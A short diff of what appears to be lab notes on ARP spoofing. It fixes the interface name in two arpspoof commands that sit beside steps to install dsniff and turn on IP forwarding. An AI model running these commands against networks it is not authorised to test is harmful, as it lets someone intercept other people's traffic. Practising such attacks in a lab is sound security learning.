@@ -38,8 +38,8 @@ ip a
 sudo apt install dsniff
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 ping (windows ip)
-terminal 1 sudo arpspoof -i etho -t (ip address) (gateway)
-terminal 2 sudo arpspoof -i etho -t (gateway) (ipaddress)
+terminal 1 sudo arpspoof -i eth0 -t (ip address) (gateway)
+terminal 2 sudo arpspoof -i eth0 -t (gateway) (ipaddress)
 
 on windows terminal -->  arp -a
 
